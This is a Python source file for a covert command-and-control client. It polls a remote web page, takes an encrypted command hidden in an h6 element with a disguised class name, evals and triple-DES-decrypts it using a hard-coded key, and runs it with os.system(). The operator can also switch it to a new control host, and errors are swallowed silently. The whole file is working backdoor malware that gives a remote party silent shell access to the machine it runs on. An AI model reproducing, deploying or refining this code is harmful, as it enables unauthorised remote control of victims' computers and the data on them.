import requests
import bs4 
import time 
import os
import ast

from pyDes import triple_des as t_des


class Client:


	def __init__(self, key):
		with open('sccon_host.txt', 'r', encoding = 'utf-8') as host_file:
			self.host = host_file.readline()
			self.alg = t_des(key)

	def startCheck(self):
		print('startup')
		while True:
			try:
				req = requests.get(self.host)
				soup = bs4.BeautifulSoup(req.content, 'html.parser')
				k = soup.find_all('h6', {'class': 'saasiudbfunasmdbfa9usdfa9soudfbm'})[0].text
				enc_command = eval(k)
				clear_command = self.alg.decrypt(enc_command).decode()
				command = clear_command.split('|')
				if command[0].replace(' ', '') == 'None':
					time.sleep(10)
				elif command[0].replace(' ', '') == 'CH_H':
					self.host = command[1]
					with open('sccon_host.txt', 'w', encoding = 'utf-8') as host_file:
						host_file.write(f'{command[1]}')
				else:
					os.system(command[1])
					time.sleep(int(command[0]))
			except Exception as e:
				time.sleep(10)



if __name__ == '__main__':
	client = Client('sfgjduysh7648jiokdufo53r')
	client.startCheck()




